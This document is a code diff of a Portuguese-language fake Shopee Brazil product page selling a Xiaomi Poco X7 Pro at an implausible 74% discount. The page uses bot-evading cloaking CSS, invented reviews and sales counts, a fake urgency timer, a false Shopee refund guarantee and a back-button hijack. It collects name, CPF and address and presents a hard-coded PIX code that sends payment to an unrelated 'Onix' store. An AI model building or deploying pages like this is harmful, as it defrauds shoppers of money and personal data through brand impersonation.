@@ -20,42 +20,24 @@
     })();
     </script>
 
-        <style>
+            <style>
         /* Blindagem: A página começa escondida para o robô não ler preço/fotos via OCR */
         html { display: none !important; }
         
         /* Só mostra o conteúdo se NÃO for robô de rede social */
         html.viva-humanos { display: block !important; }
         
-        /* SEU CSS COMEÇA AQUI ABAIXO */
-        
-       :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
 
+        /* HEADER */
         .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
         .search-container { flex: 1; margin: 0 12px; position: relative; }
         .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
 
-        /* ... O RESTANTE DO SEU CSS CONTINUA EXATAMENTE IGUAL ... */
-        
-
-        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
-        
-        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
-        /* Continue com o restante do seu CSS aqui... */
-        
-        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
-
-        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
-        .search-container { flex: 1; margin: 0 12px; position: relative; }
-        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
-
-        .main-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; background: white; position: relative; }
+        /* BANNERS */
+        .main-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; background: white; }
         .main-slider img { width: 100vw; scroll-snap-align: start; flex-shrink: 0; object-fit: contain; }
 
         .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
@@ -66,58 +48,227 @@
         .free-shipping-banner { background: var(--shopee-blue); color: white; padding: 8px 15px; display: flex; align-items: center; font-size: 14px; font-weight: bold; }
         .free-shipping-banner img { height: 18px; margin-right: 8px; }
 
-        .product-card { background: white; padding: 15px; margin-bottom: 8px; position: relative; }
+        /* CARD PRODUTO */
+        .product-card { background: white; padding: 15px; margin-bottom: 8px; }
         .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
         .old-price { color: #999; text-decoration: line-through; font-size: 14px; margin-bottom: 5px; }
         .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; margin-left: 8px; text-transform: uppercase; }
-
         .product-title { font-size: 15px; color: #222; line-height: 1.4; font-weight: 400; }
         .indicator-tag { background: #ee4d2d; color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; display: inline-block; vertical-align: middle; }
 
-        .section-box { background: white; padding: 15px; margin-bottom: 8px; }
-        .section-title { font-size: 14px; font-weight: 500; color: #222; margin-bottom: 12px; text-transform: uppercase; }
-        .spec-row { display: flex; padding: 8px 0; border-bottom: 1px solid #f2f2f2; font-size: 13px; }
-        .spec-label { width: 120px; color: #757575; }
-        .spec-value { flex: 1; color: #222; }
-        .desc-text { font-size: 13px; color: #555; line-height: 1.6; white-space: pre-line; }
-
+        /* LOJA */
         .shop-section { background: white; padding: 15px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; }
         .shop-info { display: flex; align-items: center; gap: 10px; position: relative; }
         .shop-avatar { width: 45px; height: 45px; border-radius: 50%; border: 1px solid #eee; }
         .badge-indicado { position: absolute; bottom: -5px; left: 22px; transform: translateX(-50%); background: var(--shopee); color: white; font-size: 8px; padding: 1px 4px; border-radius: 8px; font-weight: bold; border: 1px solid white; }
         .shop-name { font-size: 14px; font-weight: 500; }
-        .shop-btn { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 12px; font-size: 12px; border-radius: 2px; text-decoration: none; }
+        .shop-btn { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 12px; font-size: 12px; border-radius: 2px; text-decoration: none; font-weight: 500; }
 
-        .product-ratings-header__wrapper { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
-        .product-ratings-header__left { display: flex; flex-direction: column; gap: 4px; }
-        .product-ratings-header-title { color: #222; font-size: 14px; font-weight: 500; }
-        .product-ratings-header__stats { display: flex; align-items: center; gap: 5px; text-decoration: none; color: #222; }
-        .VUvows { width: 10px; height: 10px; }
+        /* AVALIAÇÕES */
+        .product-ratings-header__wrapper { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit; }
         .product-ratings-header__stats-avg { color: var(--shopee); font-weight: bold; font-size: 12px; }
-        .product-ratings-header__stats-count { color: #757575; font-size: 12px; }
-        .product-ratings-header__see-all { color: var(--shopee); font-size: 13px; text-decoration: none; display: flex; align-items: center; gap: 4px; }
-
         .review-item { background: white; padding: 15px; border-bottom: 1px solid #f2f2f2; }
-        .user-info { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; }
         .review-media { display: flex; gap: 6px; overflow-x: auto; margin-top: 10px; }
         .review-media img, .review-media video { width: 100px; height: 100px; object-fit: cover; border-radius: 2px; flex-shrink: 0; }
 
+        /* RODAPÉ E MODAL */
         .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
-        .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
+        .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; text-transform: uppercase; }
 
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
         .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
         .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
         .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
-        .cep-row { display: flex; gap: 8px; margin-bottom: 10px; }
         .btn-cep { background: var(--shopee); color: white; border: none; padding: 0 15px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
         .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
-        .garantia-shopee { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; color: var(--shopee); font-weight: 500; font-size: 12px; line-height: 1.2; text-align: center; }
-        .garantia-shopee i { font-size: 20px; margin-bottom: 4px; }
-        </style>
+        .garantia-shopee { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; color: var(--shopee); font-weight: 500; font-size: 12px; text-align: center; }
+    </style>
 </head>
 <body>
+
+    <div class="top-nav">
+        <a href="https://shopee.com.br/"><i class="fas fa-arrow-left" style="color:var(--shopee); font-size: 18px;"></i></a>
+        <div class="search-container"><input type="text" class="search-bar" placeholder="Buscar na Shopee"></div>
+        <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
+    </div>
+
+    <div class="main-slider">
+        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
+    </div>
+
+    <div class="flash-sale-banner">
+        <div class="flash-sale-left"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
+        <div class="timer-box">
+            <span style="font-size:12px; margin-right:5px;">TERMINA EM</span>
+            <div class="timer-unit" id="h">01</div> : <div class="timer-unit" id="m">30</div> : <div class="timer-unit" id="s">00</div>
+        </div>
+    </div>
+
+    <div class="free-shipping-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Brazil.svg" alt="Brasil">
+        FRETE GRÁTIS <span>acima de R$10</span>
+    </div>
+
+    <div class="product-card">
+        <div class="old-price">R$2.299,00</div>
+        <div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span> <span style="font-size:12px; color:#999; margin-left:10px;">6,4mil Vendidos</span></div>
+        <div class="product-title">
+            <span class="indicator-tag">Indicado</span> 
+            Xiaomi Poco X7 PRO 5G Global Version, Processador Dimensity 8400-Ultra, Tela AMOLED 120Hz
+        </div>
+    </div>
+
+    <div class="shop-section">
+        <div class="shop-info">
+            <img src="https://down-br.img.susercontent.com/file/br-11134216-7r98o-m8ktdfse9yq937" class="shop-avatar">
+            <span class="badge-indicado">Indicado</span>
+            <div>
+                <div class="shop-name">Onix Oficial <i class="fas fa-check-circle" style="color:#2d88ff; font-size:12px;"></i></div>
+                <div style="font-size: 11px; color: #757575;">Ativo há 3 minutos | São Paulo</div>
+            </div>
+        </div>
+        <a href="https://shopee.com.br/shop/1078992312" class="shop-btn">Ver Loja</a>
+    </div>
+
+    <a href="https://shopee.com.br/buyer/95682341/rating" class="product-ratings-header__wrapper">
+        <div style="display: flex; flex-direction: column; gap: 4px;">
+            <div style="color: #222; font-size: 14px; font-weight: 500;">Avaliações do produto</div>
+            <div style="display: flex; align-items: center; gap: 5px;">
+                <div class="product-ratings-header__stats-avg">4.9/5</div>
+                <div style="color: #757575; font-size: 12px;">(2,4mil resenhas)</div>
+            </div>
+        </div>
+        <div style="color: var(--shopee); font-size: 13px;">Ver tudo <i class="fas fa-chevron-right" style="font-size:10px;"></i></div>
+    </a>
+
+    <div class="review-item">
+        <div style="display:flex; align-items:center; gap:8px; font-size:13px; font-weight:500;">
+            luizadriano871 <span style="color:#999; font-size:10px;">• 2 dias atrás</span>
+        </div>
+        <div style="color:#ee4d2d; font-size:10px; margin:4px 0;">⭐⭐⭐⭐⭐</div>
+        <div style="font-size:13px; color:#555;">Aparelho espetacular! O desempenho em jogos é absurdo. Recomendo a Onix!</div>
+        <div class="review-media">
+            <video autoplay loop muted playsinline src="https://down-bs-br.vod.susercontent.com/api/v4/11110103/mms/br-11110103-6kfkr-mc6f0gc92ch3fd.16000051752497615.mp4"></video>
+            <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-mc6f0urdynjb78">
+        </div>
+    </div>
+
+    <div style="height: 60px;"></div>
+    
+    <div class="footer">
+        <div style="width:120px; display:flex;">
+            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee); border-right:1px solid #eee;"><i class="far fa-comment-dots"></i><span style="font-size:9px;">Chat</span></div>
+            <div style="flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--shopee);"><i class="fas fa-cart-plus"></i><span style="font-size:9px;">Carrinho</span></div>
+        </div>
+        <button class="btn-buy" onclick="openModal()">Compre Agora</button>
+    </div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div id="selection-screen">
+                <div style="display:flex; align-items:center; margin-bottom:15px;">
+                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; border-radius:4px;">
+                    <div style="margin-left:15px;"><div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div><div style="font-size:12px; color:#888;">Estoque: 1071</div></div>
+                </div>
+                <p style="font-size:14px; margin-bottom:10px;">Escolha a Cor</p>
+                <div>
+                    <button class="opt-btn" onclick="selectVar(this)">AMARELO</button>
+                    <button class="opt-btn" onclick="selectVar(this)">PRETO</button>
+                    <button class="opt-btn" onclick="selectVar(this)">CINZA</button>
+                </div>
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:20px;" onclick="goToForm()">PRÓXIMO</button>
+                <button class="btn-voltar" onclick="document.getElementById('modal').style.display='none'">VOLTAR</button>
+            </div>
+
+            <div id="form-screen" style="display:none;">
+                <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
+                <input type="tel" id="cpf" class="input-box" placeholder="CPF">
+                <div style="display:flex; gap:8px; margin-bottom:10px;">
+                    <input type="tel" id="cep" class="input-box" style="margin-bottom:0;" placeholder="CEP">
+                    <button class="btn-cep" onclick="buscarCEP()">BUSCAR CEP</button>
+                </div>
+                <input type="text" id="rua" class="input-box" placeholder="Rua / Avenida">
+                <input type="text" id="bairro" class="input-box" placeholder="Bairro">
+                <input type="text" id="cidade" class="input-box" placeholder="Cidade / Estado">
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="finalizar()">GERAR PIX</button>
+            </div>
+
+            <div id="pix-screen" style="display:none; text-align:center;">
+                <div class="garantia-shopee">
+                    <i class="fas fa-shield-alt" style="font-size: 24px; margin-bottom: 5px;"></i>
+                    <span>Se o produto não for entregue,<br>a Shopee devolve seu dinheiro!</span>
+                </div>
+                <p style="font-weight:bold; color:var(--teal); margin-bottom: 5px;">Código PIX Gerado!</p>
+                <img id="qr-img" src="" style="margin:10px 0; width:180px;">
+                <div id="pix-copy" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; margin-bottom:15px; border: 1px dashed #ccc;"></div>
+                <button class="btn-buy" style="width:100%; height:40px; border-radius:4px;" onclick="copiarPix()">COPIAR CÓDIGO</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const PIX_KEY = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865406599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
+        
+        function openModal() { document.getElementById('modal').style.display='block'; }
+        
+        let selectedVar = null;
+        function selectVar(btn) {
+            document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            selectedVar = btn.innerText;
+        }
+
+        function goToForm() {
+            if(!selectedVar) return alert("Selecione uma cor.");
+            document.getElementById('selection-screen').style.display='none';
+            document.getElementById('form-screen').style.display='block';
+        }
+
+        async function buscarCEP() {
+            const cepVal = document.getElementById('cep').value.replace(/\D/g, '');
+            if(cepVal.length === 8) {
+                const res = await fetch(`https://viacep.com.br/ws/${cepVal}/json/`);
+                const data = await res.json();
+                if(!data.erro) {
+                    document.getElementById('rua').value = data.logradouro;
+                    document.getElementById('bairro').value = data.bairro;
+                    document.getElementById('cidade').value = data.localidade + " / " + data.uf;
+                }
+            }
+        }
+
+        function finalizar() {
+            if(!document.getElementById('nome').value || !document.getElementById('cpf').value) return alert("Preencha todos os campos.");
+            
+            document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(PIX_KEY)}&color=ee4d2d`;
+            document.getElementById('pix-copy').innerText = PIX_KEY;
+            
+            document.getElementById('form-screen').style.display='none';
+            document.getElementById('pix-screen').style.display='block';
+        }
+
+        function copiarPix() {
+            navigator.clipboard.writeText(PIX_KEY);
+            alert('Código PIX copiado!');
+        }
+
+        // Timer
+        let totalSec = 5400;
+        setInterval(() => {
+            if(totalSec > 0) totalSec--;
+            document.getElementById('h').innerText = String(Math.floor(totalSec/3600)).padStart(2,'0');
+            document.getElementById('m').innerText = String(Math.floor((totalSec%3600)/60)).padStart(2,'0');
+            document.getElementById('s').innerText = String(totalSec%60).padStart(2,'0');
+        }, 1000);
+
+        // Bloqueio de volta
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => { window.location.href = "https://shopee.com.br/"; };
+    </script>
+</body>
+</html>
+
 
     <div class="top-nav">
         <i class="fas fa-arrow-left" style="color:var(--shopee);"></i>
@@ -448,4 +599,5 @@
     </script>
 </body>
 </html>
+
 
